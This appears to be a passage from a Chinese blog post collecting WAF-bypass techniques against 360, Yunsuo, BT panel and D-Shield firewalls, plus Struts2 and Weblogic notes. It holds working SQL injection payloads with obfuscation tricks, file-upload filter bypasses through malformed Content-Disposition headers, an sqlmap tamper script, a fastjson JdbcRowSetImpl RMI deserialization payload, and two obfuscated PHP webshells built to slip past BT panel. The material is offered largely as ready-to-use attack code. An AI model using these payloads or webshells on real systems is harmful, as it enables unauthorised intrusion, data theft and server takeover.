+<p>payload:id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp; id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp; id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp; id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp; id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp; id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp; id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp; id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;-1 union select 1,2,schema_name %0a&#x2F;<em>!from</em>&#x2F; information_schema.SCHEMATA</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524268.png" alt="img"></p>
+<h4 id="SQL注入绕过-GET-POST"><a href="#SQL注入绕过-GET-POST" class="headerlink" title="SQL注入绕过-GET+POST"></a>SQL注入绕过-GET+POST</h4><p>这算得上是一个年代久远的逻辑漏洞了，那就是当同时存在GET和POST请求时，会进入POST逻辑，从而忽略对GET请求的过滤。</p>
+<p>payload:</p>
+<p>?id&#x3D;1 union select 1,2,schema_name from information_schema.SCHEMATA</p>
+<p>POST：id&#x3D;1</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524346.png" alt="img"></p>
+<h4 id="SQL注入绕过-0a-内联注释"><a href="#SQL注入绕过-0a-内联注释" class="headerlink" title="SQL注入绕过- %0a+内联注释"></a>SQL注入绕过- %0a+内联注释</h4><p>这种绕过方法虽然只对mysql生效，但是在这么多绕过方法中，内联注释+扰乱是最好的一种。</p>
+<p>除了seletc from 需要使用%0a，其他的关键字随便绕</p>
+<p>如payload:?id&#x3D;-1 union%0a&#x2F;<em>!12345select</em>&#x2F; 1,2,schema_name%0a&#x2F;<em>!12345from</em>&#x2F;information_schema.SCHEMATA</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524772.png" alt="img"></p>
+<h4 id="SQL注入绕过-编码绕过"><a href="#SQL注入绕过-编码绕过" class="headerlink" title="SQL注入绕过-编码绕过"></a>SQL注入绕过-编码绕过</h4><p>客户端对Payload进行编码，服务端能够自动进行解码，这时候就考验WAF的编码解码能力了，如果WAF不能进行有效解码还原攻击向量，可能导致绕过，常见编码如URL编码、unicode编码（IIS）、宽字节编码等。</p>
+<p>这个地方虽然URL编码也能绕过获取数据，主要是因为WAF对POST的防御规则太过于松散，union select 随便绕，select from 用%0a就可以解决，主要分享一下编码绕过的思路。</p>
+<p>id&#x3D;-1 %55nion %53elect&#x2F;<em>!1,2,schema_name %0aFROM information_schema.SCHEMATA</em>&#x2F;</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524394.png" alt="img"></p>
+<h4 id="SQL注入绕过-分块传输"><a href="#SQL注入绕过-分块传输" class="headerlink" title="SQL注入绕过-分块传输"></a>SQL注入绕过-分块传输</h4><p>这个上面已经讲过了，对付360居然废了，如果直接输入payload然后分块后会被拦截，且包括增加注释都没用…</p>
+<h4 id="上传绕过-溢出-1"><a href="#上传绕过-溢出-1" class="headerlink" title="上传绕过-溢出"></a><strong>上传绕过-溢出</strong></h4><p>同样<strong>Content-Disposition:</strong> 字段溢出依然适用，不知道这些软waf是不是一个模子出来的…</p>
+<p>360会对文件后缀进行waf，脚本文件显然都在黑名单中。</p>
+<p>比如php</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524597.png" alt="img"></p>
+<p>我们再测试一下它会不会对文件内容进行检测，我们搬出一个最容易被杀的小马，把文件名后缀改为jpg。</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524420.png" alt="img"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524050.png" alt="img"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524056.png" alt="img"></p>
+<p>没想到上传成功了，这也就意味着如果服务器存在畸形解析是可以被利用的。当然我的服务器没有,也就无法利用。</p>
+<p>那么我们只需对后缀名进行绕过即可。</p>
+<p>我们输入足够数量的字符将 <strong>Content-Disposition:</strong> 字段溢出。</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524261.png" alt="img"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524156.png" alt="img"></p>
+<p>成功上传。</p>
+<h4 id="上传绕过-换行符-1"><a href="#上传绕过-换行符-1" class="headerlink" title="上传绕过-换行符"></a><strong>上传绕过-换行符</strong></h4><p>这种绕过方法依然是针对 <strong>Content-Disposition:</strong> 字段，利用方法为：在from-data前加回车。这样就可以绕过对文件名的过滤。</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524496.png" alt="img"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524597.png" alt="img"></p>
+<p>还有一点是经过测试出来的结果，就是不仅仅在from-data前加回车可以绕过，在name&#x3D;之后加回车同样可以</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524871.png" alt="img"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524811.png" alt="img"></p>
+<p>那么，在filename&#x3D;后加回车可以吗，答案是依旧可以，那我又尝试在参数内用换行符分离，果不其然还是可以。所以结论为： <strong>Content-Disposition:</strong> 字段 的每个参数值前或者参数内加回车都可以绕过360的后缀名过滤。</p>
+<p>比如我可以这样：</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524961.png" alt="img"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524921.png" alt="img"></p>
+<p>又或者是这样：</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524378.png" alt="img"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524278.png" alt="img"></p>
+<h3 id="云锁"><a href="#云锁" class="headerlink" title="云锁"></a>云锁</h3><h4 id="SQL注入绕过-内联注释"><a href="#SQL注入绕过-内联注释" class="headerlink" title="SQL注入绕过-内联注释"></a>SQL注入绕过-内联注释</h4><p>GET方式下，内联注释内加入数字符号字母依旧可以绕过云锁。</p>
+<p>payload:id&#x3D;-1 &#x2F;<em>!800000aaa</em>&#x2F;union &#x2F;<em>!800000aaa</em>&#x2F; select &#x2F;<em>!800000aaa</em>&#x2F; 1, &#x2F;<em>!800000aaa</em>&#x2F; user &#x2F;<em>!800000aaa</em>&#x2F; (),3</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271526125.png" alt="img"></p>
+<p><strong>但是</strong></p>
+<p>云锁还有一个扯淡的点在于它对select from关键字过滤的十分严格，但是依然有突破点，毕竟内联可以用，那就代表还有希望。</p>
+<p>构造语句为：<a target="_blank" rel="noopener" href="http://192.168.150.139/sqli/Less-1/?id=-8189&#39;">http://192.168.150.139/sqli/Less-1/?id=-8189&#39;</a> UNION &#x2F;<em>!11444all</em>&#x2F; &#x2F;<em>!11444select 1,2,(&#x2F;</em>!11444select group_concat(schema_name) from information_schema.schemata) *&#x2F; – asdf</p>
+<p>使用&#x2F;<em>!</em>&#x2F;将select from 语句包裹起来，便可绕过云锁。至于具体怎么绕过的，后面我会开一篇文章讲解。</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271526182.png" alt="img"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http:%23 %26%23 %26sqlmap.org%23 %26)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">Author:pureqh.top</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.data <span class="keyword">import</span> kb</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;Bypass yunsuo_number by pureqh&#x27;%s&#x27; only %s&quot;</span> % (os.path.basename(__file__).split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>], DBMS.MYSQL))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line"></span><br><span class="line">        payload=payload.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;  &quot;</span>,<span class="number">1</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;  AND&quot;</span>,<span class="string">&quot; REGEXP &quot;</span>[...%<span class="number">23</span> %<span class="number">26</span>*]<span class="string">&quot; and&quot;</span>,<span class="number">1</span>)</span><br><span class="line">        payload=re.sub(<span class="string">r&#x27;(ORDER BY \d+)&#x27;</span>, <span class="string">&quot;x&quot;</span>, payload)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;UNION&quot;</span>,<span class="string">&quot; REGEXP &quot;</span>[...%<span class="number">23</span> %<span class="number">26</span>*]<span class="string">&quot; union&quot;</span>,<span class="number">1</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;(SELECT (CASE WHEN (&quot;</span>,<span class="string">&quot; REGEXP &quot;</span>[...%<span class="number">23</span> %<span class="number">26</span>*]<span class="string">&quot; (SELECT (CASE WHEN (&quot;</span>,<span class="number">1</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;  AS &quot;</span>,<span class="string">&quot; REGEXP &quot;</span>[...%<span class="number">23</span> %<span class="number">26</span>*]<span class="string">&quot; as &quot;</span>,<span class="number">1</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot; OR &quot;</span>,<span class="string">&quot; REGEXP &quot;</span>[...%<span class="number">23</span> %<span class="number">26</span>*]<span class="string">&quot; or &quot;</span>,<span class="number">1</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;  WHERE &quot;</span>,<span class="string">&quot; REGEXP &quot;</span>[...%<span class="number">23</span> %<span class="number">26</span>*]<span class="string">&quot; where &quot;</span>,<span class="number">1</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;HIGH_RISK_OPERATION:0&quot;</span>,<span class="string">&quot; REGEXP &quot;</span>[...%<span class="number">23</span> %<span class="number">26</span>*]<span class="string">&quot;  &quot;</span>,<span class="number">1</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;;&quot;</span>,<span class="string">&quot;; REGEXP &quot;</span>[...%<span class="number">23</span> %<span class="number">26</span>*]<span class="string">&quot;  HTGH&quot;</span>,<span class="number">1</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;||&quot;</span>,<span class="string">&quot;; || REGEXP &quot;</span>[...%<span class="number">23</span> %<span class="number">26</span>*]<span class="string">&quot; &quot;</span>,<span class="number">1</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;THEN&quot;</span>,<span class="string">&quot; THEN REGEXP &quot;</span>[...%<span class="number">23</span> %<span class="number">26</span>*]<span class="string">&quot; &quot;</span>,<span class="number">1</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;  IN&quot;</span>,<span class="string">&quot; REGEXP &quot;</span>[...%<span class="number">23</span> %<span class="number">26</span>*]<span class="string">&quot;  IN &quot;</span>,<span class="number">1</span>)</span><br><span class="line">        <span class="comment">#payload=payload.replace(&quot;-&quot;,&quot; REGEXP &quot;[...%23 %26*]&quot;  - &quot;,1)</span></span><br><span class="line">        payload=payload.replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot; REGEXP &quot;</span>[...%<span class="number">23</span> %<span class="number">26</span>*]<span class="string">&quot;  + &quot;</span>,<span class="number">1</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;WHEN&quot;</span>,<span class="string">&quot; REGEXP &quot;</span>[...%<span class="number">23</span> %<span class="number">26</span>*]<span class="string">&quot;   &quot;</span>,<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="D盾webshell"><a href="#D盾webshell" class="headerlink" title="D盾webshell"></a>D盾webshell</h3><p><a target="_blank" rel="noopener" href="https://pureqh.top/?p=5391">https://pureqh.top/?p=5391</a></p>
+<h3 id="宝塔webshell"><a href="#宝塔webshell" class="headerlink" title="宝塔webshell"></a>宝塔webshell</h3><p><a target="_blank" rel="noopener" href="https://pureqh.top/?p=5349">https://pureqh.top/?p=5349</a></p>
+<h2 id="一些bypass总结"><a href="#一些bypass总结" class="headerlink" title="一些bypass总结"></a>一些bypass总结</h2><h3 id="fastjson-bypass-某WAF"><a href="#fastjson-bypass-某WAF" class="headerlink" title="fastjson bypass 某WAF"></a>fastjson bypass 某WAF</h3><p>demo</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&quot;@type&quot;</span>:<span class="string">&quot;java.net.URL&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;http://.dnslog.cn&quot;</span>&#125;:0</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://user-images.githubusercontent.com/55024146/119951579-aeb1fb00-bfce-11eb-87aa-67f3dbbd7fb8.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271242423.png" alt="image"></a></p>
+<p>bypass</p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:\b<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:9999&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="宝塔防火墙-Bypass"><a href="#宝塔防火墙-Bypass" class="headerlink" title="宝塔防火墙 Bypass"></a>宝塔防火墙 Bypass</h3><ul>
+<li>传参方式 $_COOKIE</li>
+<li>编码绕过流量检测</li>
+</ul>
+<p><em>3重 base64 失败</em>（似乎检测了关键字‘base64’） <a target="_blank" rel="noopener" href="https://user-images.githubusercontent.com/55024146/119949340-5c6fda80-bfcc-11eb-84bb-4d2543af7bea.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271242274.png" alt="image"></a></p>
+<p><em>3重 url编码 成功</em></p>
+<p><a target="_blank" rel="noopener" href="https://user-images.githubusercontent.com/55024146/119950026-08192a80-bfcd-11eb-8197-3d6d695b4681.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271242255.png" alt="image"></a></p>
+<p>demo1:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_COOKIE</span>;(<span class="title function_ invoke__">count</span>(<span class="variable">$p</span>)==<span class="number">23</span>&amp;&amp;<span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">gettype</span>(<span class="variable">$p</span>).<span class="title function_ invoke__">count</span>(<span class="variable">$p</span>),<span class="variable">$p</span>))?((<span class="variable">$p</span>[<span class="number">59</span>]=<span class="variable">$p</span>[<span class="number">59</span>].<span class="variable">$p</span>[<span class="number">72</span>])&amp;&amp;(<span class="variable">$p</span>[<span class="number">91</span>]=<span class="variable">$p</span>[<span class="number">59</span>](<span class="variable">$p</span>[<span class="number">91</span>]))&amp;&amp;(<span class="variable">$p</span>=<span class="variable">$p</span>[<span class="number">91</span>](<span class="variable">$p</span>[<span class="number">90</span>],<span class="variable">$p</span>[<span class="number">59</span>](<span class="variable">$p</span>[<span class="number">31</span>])))&amp;&amp;<span class="variable">$p</span>()):<span class="variable">$p</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>demo2:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$poc</span> =<span class="string">&quot;axsxsxexrxt&quot;</span>;</span><br><span class="line"><span class="variable">$poc_1</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;x&quot;</span>, <span class="variable">$poc</span>);</span><br><span class="line"><span class="variable">$poc_2</span> = <span class="variable">$poc_1</span>[<span class="number">0</span>] . <span class="variable">$poc_1</span>[<span class="number">1</span>] . <span class="variable">$poc_1</span>[<span class="number">2</span>] . <span class="variable">$poc_1</span>[<span class="number">3</span>]. <span class="variable">$poc_1</span>[<span class="number">4</span>]. <span class="variable">$poc_1</span>[<span class="number">5</span>];</span><br><span class="line"><span class="variable">$poc_2</span>(<span class="title function_ invoke__">urldecode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$_REQUEST</span>[x]))));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="一些中间件的bypass"><a href="#一些中间件的bypass" class="headerlink" title="一些中间件的bypass"></a>一些中间件的bypass</h2><h3 id="常规绕WAF思路"><a href="#常规绕WAF思路" class="headerlink" title="常规绕WAF思路"></a>常规绕WAF思路</h3><h4 id="1、错误的HTTP请求头"><a href="#1、错误的HTTP请求头" class="headerlink" title="1、错误的HTTP请求头"></a>1、错误的HTTP请求头</h4><p>类似文件上传时的绕过，通过畸形的HTTP协议头绕过WAF检测。比如绕过某些老版本WAF可以加入请求头：Content-Encoding:deflate就可以绕过WAF（此方法在文件上传绕过WAF中也适用）<br>​</p>
+<h4 id="2、通用的JAVA类关键字绕过"><a href="#2、通用的JAVA类关键字绕过" class="headerlink" title="2、通用的JAVA类关键字绕过"></a>2、通用的JAVA类关键字绕过</h4><p>将关键字转换成Unicode或者HEX编码的方式，JAVA程序会自动进行解码，所以在一定程度上能够绕过WAF<br>​</p>
+<h4 id="3、使用未公开的漏洞利用链"><a href="#3、使用未公开的漏洞利用链" class="headerlink" title="3、使用未公开的漏洞利用链"></a>3、使用未公开的漏洞利用链</h4><p>部分WAF会将公开的漏洞利用链中的关键字设置为黑名单，所以重新找一条利用链吧，自己的才是最香的<br>​</p>
+<h3 id="Struts2过WAF"><a href="#Struts2过WAF" class="headerlink" title="Struts2过WAF"></a>Struts2过WAF</h3><h4 id="1、三种快速判断struts2的方法"><a href="#1、三种快速判断struts2的方法" class="headerlink" title="1、三种快速判断struts2的方法"></a>1、三种快速判断struts2的方法</h4><p>（1）通过后缀判断<br>通过后缀判断struts2是最快速和最常见的方法，但是这种方法不太准确，有些程序员会自定义页面后缀。一般struts2页面常用后缀为.do和.action。但是也有另一种比较特殊的情况，比如：userManager!list.action类似这种带!的形式很有可能是Struts2框架</p>
+<p>（2）通过页面回显的错误消息来判断，页面不回显错误消息时则无效<br>如原始的目标地址是<a target="_blank" rel="noopener" href="http://www.struts2-vuln.com,则检测所用的地址是http//www.struts2-vuln.com/?actionErrors=1111111%EF%BC%8C%E5%A6%82%E6%9E%9C%E8%BF%94%E5%9B%9E%E7%9A%84%E9%A1%B5%E9%9D%A2%E5%87%BA%E7%8E%B0%E5%BC%82%E5%B8%B8%EF%BC%8C%E5%88%99%E5%8F%AF%E4%BB%A5%E8%AE%A4%E5%AE%9A%E4%B8%BA%E7%9B%AE%E6%A0%87%E6%98%AF%E5%9F%BA%E4%BA%8EStruts2%E6%A1%86%E6%9E%B6%E6%9E%84%E5%BB%BA%E7%9A%84%E3%80%82%E5%BC%82%E5%B8%B8%E6%83%85%E5%86%B5%E5%8C%85%E6%8B%AC%E9%A1%B5%E9%9D%A2%E7%9B%B4%E6%8E%A5%E5%87%BA%E7%8E%B0404%E3%80%81500%E7%AD%89%E9%94%99%E8%AF%AF%EF%BC%8C%E9%A1%B5%E9%9D%A2%E4%B8%8A%E8%BE%93%E5%87%BA%E4%BA%86%E4%B8%8E%E4%B8%9A%E5%8A%A1%E6%9C%89%E5%85%B3%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF%EF%BC%8C%E6%88%96%E8%80%851111111%E8%A2%AB%E5%9B%9E%E6%98%BE%E5%88%B0%E9%A1%B5%E9%9D%A2%E4%B8%8A%E4%BA%86%EF%BC%8C%E9%A1%B5%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9%E7%BB%93%E6%9E%84%E5%8F%91%E7%94%9F%E4%BA%86%E6%98%8E%E6%98%BE%E7%9A%84%E6%94%B9%E5%8F%98%EF%BC%8C%E9%A1%B5%E9%9D%A2%E5%8F%91%E7%94%9F%E7%9A%84%E9%87%8D%E5%AE%9A%E5%90%91%E3%80%82(%E8%AF%A5%E6%96%B9%E6%B3%95%E7%9B%AE%E5%89%8D%E5%9C%A8%E6%B5%8B%E8%AF%95%E6%97%B6%E5%9F%BA%E6%9C%AC%E6%9C%AA%E6%88%90%E5%8A%9F%E8%BF%87%EF%BC%8C%E4%BB%85%E5%BD%93%E4%BD%9C%E7%9F%A5%E8%AF%86%E7%82%B9%E7%95%99%E5%AD%98)">http://www.struts2-vuln.com，则检测所用的地址是http://www.struts2-vuln.com/?actionErrors=1111111，如果返回的页面出现异常，则可以认定为目标是基于Struts2框架构建的。异常情况包括页面直接出现404、500等错误，页面上输出了与业务有关错误消息，或者1111111被回显到页面上了，页面的内容结构发生了明显的改变，页面发生的重定向。(该方法目前在测试时基本未成功过，仅当作知识点留存</a><br>​</p>
+<p>（3）判断 &#x2F;struts&#x2F;webconsole.html 是否存在来进行判断，需要 devMode 为 true<br>[<img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271528061.png" alt="img">](<a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2021/png/411367/1637484443630-48d128ba-d056-4ce9-8a76-3e8bbd19fbc8.png#clientId=u12f63578-60ea-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=ud3fb5681&amp;margin=[object">https://cdn.nlark.com/yuque/0/2021/png/411367/1637484443630-48d128ba-d056-4ce9-8a76-3e8bbd19fbc8.png#clientId=u12f63578-60ea-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=ud3fb5681&amp;margin=[object</a> Object]&amp;name&#x3D;image.png&amp;originHeight&#x3D;1182&amp;originWidth&#x3D;2406&amp;originalType&#x3D;url&amp;ratio&#x3D;1&amp;rotation&#x3D;0&amp;showTitle&#x3D;false&amp;size&#x3D;82743&amp;status&#x3D;done&amp;style&#x3D;none&amp;taskId&#x3D;u2fe26581-8b2e-464f-afd2-44466eaa766&amp;title&#x3D;)</p>
+<h4 id="2、Struts2中的-和"><a href="#2、Struts2中的-和" class="headerlink" title="2、Struts2中的$和%"></a>2、Struts2中的$和%</h4><p>在Struts2中，%和$作用一致，可以相互替换，当WAF拦截了%时可以试试用$替换，反之亦然<br>​</p>
+<h4 id="3、如何绕过waf"><a href="#3、如何绕过waf" class="headerlink" title="3、如何绕过waf"></a>3、如何绕过waf</h4><p>这里我们以s2-016和s2-045为例，演示如何绕过waf，实验环境如下：<br>[<img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271528076.png" alt="img">](<a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2021/png/411367/1637484678670-9a000f8e-deb7-48c1-ab2d-ac774733384a.png#clientId=u12f63578-60ea-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=295&amp;id=ub0bbe0fd&amp;margin=[object">https://cdn.nlark.com/yuque/0/2021/png/411367/1637484678670-9a000f8e-deb7-48c1-ab2d-ac774733384a.png#clientId=u12f63578-60ea-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=295&amp;id=ub0bbe0fd&amp;margin=[object</a> Object]&amp;name&#x3D;image.png&amp;originHeight&#x3D;884&amp;originWidth&#x3D;2298&amp;originalType&#x3D;binary&amp;ratio&#x3D;1&amp;rotation&#x3D;0&amp;showTitle&#x3D;false&amp;size&#x3D;174035&amp;status&#x3D;done&amp;style&#x3D;none&amp;taskId&#x3D;uc112adc8-0e14-4e4b-8683-60aba1c1e18&amp;title&#x3D;&amp;width&#x3D;766)<br>我们先用工具跑一下<br><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271531954.png" alt="img"><br>这个时候工具就不管用了，什么都没有发现，还是我们手输poc比较靠谱一些，先试一下最基本的s2-016的验证poc<br><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271530605.png" alt="img"><br>左下角提示waitting，说明Poc被WAF拦截掉了，我们试一下绕过<br>针对s2-016的绕过，我们只需要双写大括号就可以<br><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271530111.png" alt="img"><br>这里Poc就成功执行了11*11，返回包里也返回了121<br>我们在尝试一下同样用双写的方法绕过一下s2-045<br><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271530638.png" alt="img"><br>GG了，看来这样绕不过去。<br>我们重新看一下s2-045的poc，这么长一大串，WAF最有可能使用哪种方式进行检测呢？poc里那么多关键字，很大几率是对关键字进行检测吧，那我们吧关键字拆分开试一下<br><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271530761.png" alt="img"><br>可以了，用+拼接关键字，成功绕过了WAF对关键字的检测。不过不知道编码的方法可不可以</p>
+<h3 id="Weblogic过WAF"><a href="#Weblogic过WAF" class="headerlink" title="Weblogic过WAF"></a>Weblogic过WAF</h3><h4 id="1、两种快速判断Weblogic的方法"><a href="#1、两种快速判断Weblogic的方法" class="headerlink" title="1、两种快速判断Weblogic的方法"></a>1、两种快速判断Weblogic的方法</h4><p>（1）通过404页面判断<br>（2）通过X-powered-by头判断：servlet&#x2F;2.4(版本) JSP&#x2F;2.5(版本)<br>​</p>
